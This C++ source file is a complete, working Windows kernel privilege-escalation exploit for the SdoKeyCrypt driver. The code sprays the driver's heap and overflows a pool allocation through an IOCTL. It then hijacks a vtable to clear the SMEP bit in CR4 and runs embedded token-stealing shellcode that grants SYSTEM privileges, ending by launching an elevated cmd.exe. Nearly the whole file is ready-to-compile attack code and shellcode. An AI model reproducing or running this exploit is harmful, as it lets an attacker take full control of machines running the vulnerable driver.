//
// C++11 standard is required
//
#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <Psapi.h>

#define SDOKEYCRYPT_DEVICE_NAME         TEXT("\\\\.\\SdoKeyCrypt")
#define SDOKEYCRYPT_IOCTRL_CODE_0x00    ((DWORD)(-0x7FFF3FFC))
#define SDOKEYCRYPT_IOCTRL_CODE_0x14    ((DWORD)(-0x7FFF3FFC + 0x14))
#define SDOKEYCRYPT_IOCTRL_CODE_0x18    ((DWORD)(-0x7FFF3FFC + 0x18))
#define SDOKEYCRYPT_IOCTRL_CODE_0x1C    ((DWORD)(-0x7FFF3FFC + 0x1C))
#define SDOKEYCRYPT_IOCTRL_CODE_0x20    ((DWORD)(-0x7FFF3FFC + 0x20))
#define SDOKEYCRYPT_IOCTRL_CODE_0x48    ((DWORD)(-0x7FFF3FFC + 0x48))

struct XTEAContext {
    DWORD Data[2];
    DWORD Key[4];
};

DWORD SdoKeyCryptCreateHandle(HANDLE hDevice, PULONG pSdoKeyCryptHandle) {
    DWORD cbBytesWritten;
    return DeviceIoControl(hDevice,
                           SDOKEYCRYPT_IOCTRL_CODE_0x00,
                           NULL, 0,
                           pSdoKeyCryptHandle, sizeof(ULONG),
                           &cbBytesWritten, NULL) ? ERROR_SUCCESS : GetLastError();
}

DWORD SdoKeyCryptCloseHandle(HANDLE hDevice, ULONG SdoKeyCryptHandle) {
    DWORD cbBytesWritten;
    ULONG Handle = SdoKeyCryptHandle;
    return DeviceIoControl(hDevice,
                           SDOKEYCRYPT_IOCTRL_CODE_0x1C,
                           &Handle, sizeof(ULONG),
                           NULL, 0,
                           &cbBytesWritten, NULL) ? ERROR_SUCCESS : GetLastError();
}

DWORD SdoKeyCryptSubmitXTEAContext(HANDLE hDevice, ULONG SdoKeyCryptHandle, const XTEAContext& XTeaContext) {
    DWORD cbBytesWritten;
    struct {
        ULONG Handle;
        XTEAContext Context;
    } InputBuffer;
    static_assert(sizeof(InputBuffer) == 0x1C, "incorrect size");

    InputBuffer.Handle = SdoKeyCryptHandle;
    InputBuffer.Context = XTeaContext;

    return DeviceIoControl(hDevice,
                           SDOKEYCRYPT_IOCTRL_CODE_0x14,
                           &InputBuffer, sizeof(InputBuffer),
                           NULL, 0,
                           &cbBytesWritten, NULL) ? ERROR_SUCCESS : GetLastError();
}

DWORD SdoKeyCryptCallUnknownVfn1(HANDLE hDevice, ULONG SdoKeyCryptHandle) {
    DWORD cbBytesWritten;
    ULONG Handle = SdoKeyCryptHandle;
    return DeviceIoControl(hDevice,
                           SDOKEYCRYPT_IOCTRL_CODE_0x20,
                           &Handle, sizeof(ULONG),
                           NULL, 0,
                           &cbBytesWritten, NULL) ? ERROR_SUCCESS : GetLastError();
}

DWORD SdoKeyCryptCallUnknownVfn2(HANDLE hDevice, ULONG SdoKeyCryptHandle) {
    DWORD cbBytesWritten;
    ULONG Handle = SdoKeyCryptHandle;
    return DeviceIoControl(hDevice,
                           SDOKEYCRYPT_IOCTRL_CODE_0x48,
                           &Handle, sizeof(ULONG),
                           NULL, 0,
                           &cbBytesWritten, NULL) ? ERROR_SUCCESS : GetLastError();
}

//
// Actually, this is not a standard XTEA encryption algorithm
// The difference are
//
// (In standard one)
//   l += (((r << 4) ^ (r >> 5)) + r) ^ (sum + Ctx.Key[sum % 4]);
//   sum += 0x9E3779B9;
//   r += (((l << 4) ^ (l >> 5)) + l) ^ (sum + Ctx.Key[(sum >> 11) % 4]);
//
// (In the following one)
//   l += (((r << 4) ^ (r >> 5))) + (r ^ sum) + Ctx.Key[sum % 4];
//   sum += 0x9E3779B9;
//   r += (((l << 4) ^ (l >> 5))) + (l ^ sum) + Ctx.Key[(sum >> 11) % 4];
//
void XTEAEncryptBlock(XTEAContext& Ctx, UINT32 round = 32) {
    DWORD& l = Ctx.Data[0];
    DWORD& r = Ctx.Data[1];
    DWORD sum = 0;
    for (DWORD i = 0; i < round; ++i) {
        l += (((r << 4) ^ (r >> 5))) + (r ^ sum) + Ctx.Key[sum % 4];
        sum += 0x9E3779B9;
        r += (((l << 4) ^ (l >> 5))) + (l ^ sum) + Ctx.Key[(sum >> 11) % 4];
    }
}

void XTEADecryptBlock(XTEAContext& Ctx, UINT32 round = 32) {
    DWORD& l = Ctx.Data[0];
    DWORD& r = Ctx.Data[1];
    DWORD sum = static_cast<DWORD>(0x9E3779B9 * round);
    for (DWORD i = 0; i < round; ++i) {
        r -= (((r << 4) ^ (l >> 5))) + (l ^ sum) + Ctx.Key[(sum >> 11) % 4];
        sum -= 0x9E3779B9;
        l -= (((r << 4) ^ (r >> 5))) + (r ^ sum) + Ctx.Key[sum % 4];
    }
}

DWORD GetBaseAddressOfKernelModule(PVOID& Addr, PCTSTR pszModuleName) {
    DWORD Status = ERROR_SUCCESS;
    PVOID* lpImageBase = NULL;
    DWORD cbSize = 0;
    

    if (!EnumDeviceDrivers(NULL, 0, &cbSize)) {
        Status = GetLastError();
        goto ON_GetBaseAddressOfKernelModule_ERROR;
    }

    lpImageBase = (PVOID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize);
    if (lpImageBase == NULL) {
        Status = GetLastError();
        goto ON_GetBaseAddressOfKernelModule_ERROR;
    }

    if (!EnumDeviceDrivers(lpImageBase, cbSize, &cbSize)) {
        Status = GetLastError();
        goto ON_GetBaseAddressOfKernelModule_ERROR;
    }

    for (DWORD i = 0; i < cbSize / sizeof(PVOID); ++i) {
        TCHAR ImageBaseName[256] = {};
        if (GetDeviceDriverBaseName(lpImageBase[i], ImageBaseName, sizeof(ImageBaseName)) == 0) {
            Status = GetLastError();
            goto ON_GetBaseAddressOfKernelModule_ERROR;
        } else {
            if (_tcsicmp(pszModuleName, ImageBaseName) == 0) {
                Addr = lpImageBase[i];
                break;
            }
        }
    }

ON_GetBaseAddressOfKernelModule_ERROR:
    if (lpImageBase)
        HeapFree(GetProcessHeap(), 0, lpImageBase);
    return ERROR_SUCCESS;
}

PVOID GetProcAddressByHeader(HMODULE hModule, LPCVOID lpProcHeader, SIZE_T cbProcHeader) {
    LPBYTE lpModuleBase = reinterpret_cast<LPBYTE>(hModule);

    PIMAGE_DOS_HEADER lpDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (lpDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS lpNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(lpModuleBase + lpDosHeader->e_lfanew);
    if (lpNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    LPBYTE lpBaseOfCode = lpModuleBase + lpNtHeaders->OptionalHeader.BaseOfCode;
    for (DWORD i = 0; i < lpNtHeaders->OptionalHeader.SizeOfCode; ++i) {
        if (RtlCompareMemory(lpBaseOfCode + i, lpProcHeader, cbProcHeader) == cbProcHeader)
            return lpBaseOfCode + i;
    }

    return NULL;
}

#define KiSaveInitialProcessorControlStateHeader    \
    "\x0f\x20\xc0"                  \
    "\x48\x89\x01"                  \
    "\x0f\x20\xd0"                  \
    "\x48\x89\x41\x08"              \
    "\x0f\x20\xd8"                  \
    "\x48\x89\x41\x10"              \
    "\x0f\x20\xe0"                  \
    "\x48\x89\x41\x18"              \
    "\x44\x0f\x20\xc0"              \
    "\x48\x89\x81\xA0\x00\x00\x00"  \
    "\x0F\x01\x41\x56"

#define KiSaveInitialProcessorControlStateHeaderSize (sizeof(KiSaveInitialProcessorControlStateHeader) - 1)

#define KiRestoreProcessorControlStateHeader    \
    "\x48\x8b\x01"          \
    "\x0f\x22\xc0"          \
    "\x48\x8b\x41\x10"      \
    "\x0f\x22\xd8"          \
    "\x48\x8b\x41\x18"

#define KiRestoreProcessorControlStateHeaderSize (sizeof(KiRestoreProcessorControlStateHeader) - 1)

#define SDOKEYCRYPT_HANDLE_COUNT 22
#define SDOKEYCRYPT_CONTEXT_COUNT 0xb8

struct SdoKeyCryptUnknownVTable {
    PVOID vfn0;
    PVOID vfn1;
    PVOID vfn2;
} UnknownVTable, UnknownVTable2;

struct {
    SdoKeyCryptUnknownVTable* lpVTable;
    ULONG_PTR CR2;
    ULONG_PTR CR3;
    ULONG_PTR CR4;
    BYTE LeftBytes[4096 - 4 * sizeof(PVOID)];
} InteractiveBuffer;

int _tmain(int argc, PTSTR argv[]) {
    PVOID lpBaseOfKernel = NULL;
    PVOID lpfnKiSaveInitialProcessorControlState = NULL;
    PVOID lpfnKiRestoreProcessorControlState = NULL;
    PVOID lpfnSetCr4ByRcxROPGadget = NULL;
    PVOID lpShellcode = NULL;

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    DWORD HandleIndex = -1;
    ULONG SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT];
    BYTE OverflowData[SDOKEYCRYPT_CONTEXT_COUNT];

    //
    // Get kernel base address
    //

    if (DWORD err = GetBaseAddressOfKernelModule(lpBaseOfKernel, TEXT("ntoskrnl.exe"))) {
        _tprintf_s(TEXT("[-] Get base address of ntoskrnl.exe\n"
                        " |- Error Code = 0x%.8x\n"), err);
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Get base address of ntoskrnl.exe\n"
                        " |- Kernel base address = 0x%p\n"), lpBaseOfKernel);
    }

    //
    // Get addresses of 
    //   1. KiSaveInitialProcessorControlState
    //   2. KiRestoreProcessorControlState
    //   3. Set-cr4-by-RCX ROPGadget
    //

    {
        HMODULE hKernel = LoadLibrary(TEXT("ntoskrnl.exe"));    // never fail here

        lpfnKiSaveInitialProcessorControlState = 
            GetProcAddressByHeader(hKernel, 
                                   KiSaveInitialProcessorControlStateHeader, 
                                   KiSaveInitialProcessorControlStateHeaderSize);

        lpfnKiRestoreProcessorControlState = 
            GetProcAddressByHeader(hKernel, 
                                   KiRestoreProcessorControlStateHeader, 
                                   KiRestoreProcessorControlStateHeaderSize);

        lpfnSetCr4ByRcxROPGadget =
            GetProcAddressByHeader(hKernel,
                                   "\x0f\x22\xe1"    // mov cr4, rcx
                                   "\xc3",           // ret
                                   4);

        if (lpfnKiRestoreProcessorControlState && lpfnKiSaveInitialProcessorControlState && lpfnSetCr4ByRcxROPGadget) {
            lpfnKiSaveInitialProcessorControlState =
                reinterpret_cast<LPBYTE>(lpBaseOfKernel) +
                (reinterpret_cast<LPBYTE>(lpfnKiSaveInitialProcessorControlState) - reinterpret_cast<LPBYTE>(hKernel));

            lpfnKiRestoreProcessorControlState =
                reinterpret_cast<LPBYTE>(lpBaseOfKernel) +
                (reinterpret_cast<LPBYTE>(lpfnKiRestoreProcessorControlState) - reinterpret_cast<LPBYTE>(hKernel));

            lpfnSetCr4ByRcxROPGadget = 
                reinterpret_cast<LPBYTE>(lpBaseOfKernel) +
                (reinterpret_cast<LPBYTE>(lpfnSetCr4ByRcxROPGadget) - reinterpret_cast<LPBYTE>(hKernel));
        } else {    // clear if one of addresses does no found.
            lpfnKiSaveInitialProcessorControlState = nullptr;
            lpfnKiRestoreProcessorControlState = nullptr;
            lpfnSetCr4ByRcxROPGadget = nullptr;
        }

        FreeLibrary(hKernel);
    }

    if (lpfnKiRestoreProcessorControlState && lpfnKiSaveInitialProcessorControlState && lpfnSetCr4ByRcxROPGadget) {
        _tprintf_s(TEXT("[+] Calculating addresses of some kernel routines ...\n"));
        _tprintf_s(TEXT(" |- KiSaveInitialProcessorControlState = 0x%p\n"), lpfnKiSaveInitialProcessorControlState);
        _tprintf_s(TEXT(" |- KiRestoreProcessorControlState     = 0x%p\n"), lpfnKiRestoreProcessorControlState);
        _tprintf_s(TEXT(" |- SetCr4ByRcxROPGadget               = 0x%p\n"), lpfnSetCr4ByRcxROPGadget);
    } else {
        _tprintf_s(TEXT("[-] Calculating addresses of some kernel routines ...\n"));
        goto ON_tmain_ERROR;
    }

    //
    // Allocate memory for shellcode
    //

    lpShellcode = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpShellcode == NULL) {
        _tprintf_s(TEXT("[-] Allocating memory for shellcode\n"
                        " |- Error Code = 0x%.8x\n"), GetLastError());
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Allocating memory for shellcode\n"
                        " |- Shellcode address = 0x%p\n"), lpShellcode);
    }

    //
    // Set shellcode
    //

    {
        BYTE shellcode[] = 
            "\x65\x4c\x8b\x04\x25\x88\x01\x00\x00"  //      mov r8, gs:[0x188]
            "\x4d\x8b\x80\xb8\x00\x00\x00"          //      mov r8, qword ptr [r8 + 0xb8]
            "\x4d\x8b\x88\xe8\x02\x00\x00"          //      mov r9, qword ptr [r8 + 0x2e8]
                                                    // find_system_process:
            "\x4d\x8b\x09"                          //      mov r9, qword ptr [r9]
            "\x4d\x8d\x91\x18\xfd\xff\xff"          //      lea r10, qword ptr [r9 - 0x2e8]
            "\x49\x8b\x92\xe0\x02\x00\x00"          //      mov rdx, qword ptr [r10 + 0x2e0]
            "\x48\x83\xfa\x04"                      //      cmp rdx, 4
            "\x75\xe9"                              //      jnz find_system_process
                                                    // found_system_process:
            "\x49\x8b\x92\x58\x03\x00\x00"          //      mov rdx, qword ptr [r10 + 0x358]
            "\x80\xe2\xf0"                          //      and dl, 0xf0
            "\x49\x89\x90\x58\x03\x00\x00"          //      mov qword ptr [r8 + 0x358], rdx
                                                    // prepare_to_restore_cr4_and_return:
            "\x48\x8b\x00"                          //      mov rax, qword ptr [rax]        // qword ptr [rax] stores lpfnSetCr4ByRcxROPGadget
            "\x50"                                  //      push rax
            "\x0f\x20\xe1"                          //      mov rcx, cr4
            "\x48\x81\xf1\x00\x00\x10\x00"          //      xor rcx, 0x100000
            "\xc3";                                 //      ret
        RtlCopyMemory(lpShellcode, shellcode, sizeof(shellcode));
    }

    _tprintf_s(TEXT("[*] Shellcode has been ready\n"));

    //
    // Open SdoKeyCrypt device
    //

    hDevice = CreateFile(SDOKEYCRYPT_DEVICE_NAME,
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_DEVICE,
                         NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        _tprintf_s(TEXT("[-] Try to open \"%s\"\n"
                        " |- Error Code = 0x%.8x\n"), SDOKEYCRYPT_DEVICE_NAME, GetLastError());
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Try to open \"%s\"\n" 
                        " |- hDevice = 0x%p\n"), SDOKEYCRYPT_DEVICE_NAME, hDevice);
    }

    //
    // Create SdoKeyCrypt handles to spray driver's heap
    //

    for (int i = 0; i < SDOKEYCRYPT_HANDLE_COUNT; ++i) {
        if (DWORD err = SdoKeyCryptCreateHandle(hDevice, SdoKeyCryptHandles + i)) {
            _tprintf_s(TEXT("[-] Creating %d SdoKeyCrypt handles to spray heap\n"
                            " |- Error Code = 0x%.8x\n"), SDOKEYCRYPT_HANDLE_COUNT, err);
            goto ON_tmain_ERROR;
        }
    }

    _tprintf_s(TEXT("[+] Creating %d SdoKeyCrypt handles to spray heap\n"), SDOKEYCRYPT_HANDLE_COUNT);

    //
    // Set overflow data
    //

    *reinterpret_cast<PVOID*>(OverflowData) = &InteractiveBuffer;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x08) = 0x5343504c02020003;   // fake pool header
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x10) = 0xfff0f0f0fff0f0f0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x18) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x20) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x28) = 0x5343504c02060002;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x30) = 0xfff0f0f0fff0f0f0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x38) = reinterpret_cast<ULONG_PTR>(&UnknownVTable2);
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x40) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x48) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x50) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x58) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x60) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x68) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x70) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x78) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x80) = 0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x88) = 0x5343504c02030006;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x90) = 0xfff0f0f0fff0f0f0;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0x98) = 0xAAAAAAAAAAAAAAAA;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0xa0) = 0xAAAAAAAAAAAAAAAA;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0xa8) = 0xAAAAAAAAAAAAAAAA;
    *reinterpret_cast<ULONG_PTR*>(OverflowData + 0xb0) = 0xAAAAAAAAAAAAAAAA;

    _tprintf_s(TEXT("[*] OverflowData has been ready\n"));

    //
    // Submit XTEAContexts. One XTEContext represents one byte
    // These bytes will be used to overflow a heap hole
    //
    {
        XTEAContext XTeaCtx;
        memcpy(XTeaCtx.Key, "AAAAAAAAAAAAAAAA", sizeof(XTeaCtx.Key));   // set key

        for (int i = 0; i < SDOKEYCRYPT_CONTEXT_COUNT; ++i) {
            XTeaCtx.Data[0] = OverflowData[i];
            XTeaCtx.Data[1] = 0;
            XTEAEncryptBlock(XTeaCtx);
            if (DWORD err = SdoKeyCryptSubmitXTEAContext(hDevice, SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT - 1], XTeaCtx)) {
                _tprintf_s(TEXT("[-] Submiting OverflowData\n"
                                " |- Error Code = 0x%.8x\n"), err);
                goto ON_tmain_ERROR;
            } else {
                
            } 
        }
    }

    _tprintf_s(TEXT("[+] Submiting OverflowData\n"));

    //
    // Close one SdoKeyCrypt to create a heap hole
    //
    if (DWORD err = SdoKeyCryptCloseHandle(hDevice, SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT / 2])) {
        _tprintf_s(TEXT("[-] Closing a SdoKeyCrypt handle. Handle value = 0x%.8x\n"
                        " |- Error Code = 0x%.8x\n"), 
                   SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT / 2],
                   err);
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Closing a SdoKeyCrypt handle. Handle value = 0x%.8x\n"), 
                   SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT / 2]);
    }

    //
    // Trigger overflow
    //
    {
        DWORD cbBytesReturned;
        BYTE InputBuffer[0x88];
        BYTE OutBuffer[0x800];
        ((DWORD*)InputBuffer)[0] = SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT - 1];
        ((DWORD*)InputBuffer)[1] = 0x20 - SDOKEYCRYPT_CONTEXT_COUNT;
        DeviceIoControl(hDevice,
                        SDOKEYCRYPT_IOCTRL_CODE_0x18,
                        InputBuffer, 0x88,
                        OutBuffer, 0x800,
                        &cbBytesReturned, NULL);
        _tprintf_s(TEXT("[*] Triggering overflow ...\n"));
    }

    //
    // Prepare virtual table
    //
    InteractiveBuffer.lpVTable = &UnknownVTable;
    UnknownVTable.vfn0 = lpfnSetCr4ByRcxROPGadget;
    UnknownVTable.vfn1 = reinterpret_cast<LPBYTE>(lpfnKiSaveInitialProcessorControlState) + 6; // skip "mov rax, cr0; mov [rcx], rax"
    UnknownVTable.vfn2 = reinterpret_cast<LPBYTE>(lpfnKiRestoreProcessorControlState) + 6;     // skip "mov rax, qword ptr [rcx]; mov cr0, rax"
    UnknownVTable2.vfn0 = reinterpret_cast<LPBYTE>(lpfnSetCr4ByRcxROPGadget) + 3;               // skip "mov cr4, rcx"
    UnknownVTable2.vfn1 = reinterpret_cast<LPBYTE>(lpfnSetCr4ByRcxROPGadget) + 3;               // skip "mov cr4, rcx"
    UnknownVTable2.vfn2 = reinterpret_cast<LPBYTE>(lpfnSetCr4ByRcxROPGadget) + 3;               // skip "mov cr4, rcx"

    _tprintf_s(TEXT("[*] InteractiveBuffer.lpVTable and UnknownVTable have been ready\n"));

    //
    // Finding corrupted handle.
    // Once corrupted handle's vfn1 is called, we will get the value of $CR4 register.
    //

    for (DWORD i = 0; i < SDOKEYCRYPT_HANDLE_COUNT; ++i) {
        if (i != SDOKEYCRYPT_HANDLE_COUNT / 2) {
            SdoKeyCryptCallUnknownVfn1(hDevice, SdoKeyCryptHandles[i]);
            if (InteractiveBuffer.CR4 != 0) {
                HandleIndex = i;
                break;
            }
        } else {    // we have closed it
            continue;
        }
    }

    if (HandleIndex == -1) {
        _tprintf_s(TEXT("[-] Cannot find corrupted handle. Abort!\n"));
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Corrupted handle is found. Handle value = 0x%.8x\n"), SdoKeyCryptHandles[HandleIndex]);
    }

    //
    // Now we should disable SMEP for all logical processor(s)
    //

    {
        int Cr4UpdateCounter = 0;
        while (true) {
            //
            // We try to get the value of $CR4 100 times.
            // If none of 100 times indicates SMEP is still enable, 
            //   we can consider that SMEP has been disabled for all logical processor(s).
            //

            bool bCr4Updated = false;

            for (int i = 0; i < 100; ++i) {
                //
                // Call KiSaveInitialProcessorControlState to get the value of $CR4
                //
                if (DWORD err = SdoKeyCryptCallUnknownVfn1(hDevice, SdoKeyCryptHandles[HandleIndex])) {
                    _tprintf_s(TEXT("[-] Failed on calling SdoKeyCryptCallUnknownVfn1\n"
                                    " |- Error Code = 0x%.8x\n"), err);
                    goto ON_tmain_ERROR;
                }

                if ((InteractiveBuffer.CR4 & 0x100000) == 0)
                    continue;
                else
                    InteractiveBuffer.CR4 ^= 0x100000;  // Disable SMEP

                //
                // Call KiRestoreProcessorControlState to apply modification to $CR4
                //
                if (DWORD err = SdoKeyCryptCallUnknownVfn2(hDevice, SdoKeyCryptHandles[HandleIndex])) {
                    _tprintf_s(TEXT("[-] Failed on calling SdoKeyCryptCallUnknownVfn2\n"
                                    " |- Error Code = 0x%.8x\n"), err);
                    goto ON_tmain_ERROR;
                }

                bCr4Updated = true;
                ++Cr4UpdateCounter;
                break;
            }

            if (!bCr4Updated)
                break;
            else
                _tprintf_s(TEXT("[*] SMEP has been disabled with %d times\n"), Cr4UpdateCounter);
        }
    }
    
    _tprintf_s(TEXT("[*] 100-times-detection has been passed. \n"
                    " |  SMEP should be disabled for all logical processors now\n"));

    //
    // Call shellcode and restore SMEP for one logical processor
    //

    UnknownVTable.vfn1 = lpShellcode;

    _tprintf_s(TEXT("[*] Set UnknownVTable.vfn1 to lpShellcode\n"));

    if (DWORD err = SdoKeyCryptCallUnknownVfn1(hDevice, SdoKeyCryptHandles[SDOKEYCRYPT_HANDLE_COUNT / 2 + 1])) {
        _tprintf_s(TEXT("[-] Failed on calling SdoKeyCryptCallUnknownVfn1\n"
                        " |- Error Code = 0x%.8x\n"), err);
        goto ON_tmain_ERROR;
    } else {
        _tprintf_s(TEXT("[+] Shellcode has been executed\n"));
    }

    //
    // Now we should restore SMEP for all logical processor(s)
    //
    UnknownVTable.vfn1 = (BYTE*)lpfnKiSaveInitialProcessorControlState + 6; // skip "mov rax, cr0; mov [rcx], rax"
    {
        int Cr4UpdateCounter = 0;
        while (true) {
            bool bCr4Updated = false;
            for (int i = 0; i < 100; ++i) {
                //
                // Call KiSaveInitialProcessorControlState to get the value of $CR4
                //
                if (DWORD err = SdoKeyCryptCallUnknownVfn1(hDevice, SdoKeyCryptHandles[HandleIndex])) {
                    _tprintf_s(TEXT("[-] Failed on calling SdoKeyCryptCallUnknownVfn1\n"
                                    " |- Error Code = 0x%.8x\n"), err);
                    goto ON_tmain_ERROR;
                }

                if ((InteractiveBuffer.CR4 & 0x100000) == 0)
                    InteractiveBuffer.CR4 ^= 0x100000;  // Enable SMEP
                else
                    continue;

                //
                // Call KiRestoreProcessorControlState to apply modification to $CR4
                //
                if (DWORD err = SdoKeyCryptCallUnknownVfn2(hDevice, SdoKeyCryptHandles[HandleIndex])) {
                    _tprintf_s(TEXT("[-] Failed on calling SdoKeyCryptCallUnknownVfn2\n"
                                    " |- Error Code = 0x%.8x\n"), err);
                    goto ON_tmain_ERROR;
                }

                bCr4Updated = true;
                ++Cr4UpdateCounter;
                break;
            }

            if (!bCr4Updated)
                break;
            else
                _tprintf_s(TEXT("[*] SMEP has been enabled with %d times\n"), Cr4UpdateCounter);
        }
    }

    _tprintf_s(TEXT("[*] 100-times-detection has been passed\n"
                    " |  SMEP should be enabled for all logical processors now\n"));

    {
        TCHAR CmdAppName[] = TEXT("cmd.exe");
        STARTUPINFO si = {};
        PROCESS_INFORMATION pi = {};
        if (!CreateProcess(NULL,
                           CmdAppName,
                           NULL,
                           NULL,
                           TRUE,
                           CREATE_NEW_CONSOLE,
                           NULL,
                           NULL,
                           &si,
                           &pi)) {
            _tprintf_s(TEXT("[-] Launching shell ...\n"
                            " |- Error Code = 0x%.8x\n"), GetLastError());
        } else {
            _tprintf_s(TEXT("[+] Launching shell ...\n"));
        }
    }

ON_tmain_ERROR:
    if (hDevice != INVALID_HANDLE_VALUE)
        CloseHandle(hDevice);
    if (lpShellcode)
        VirtualFree(lpShellcode, 0, MEM_RELEASE);
    return 0;
}

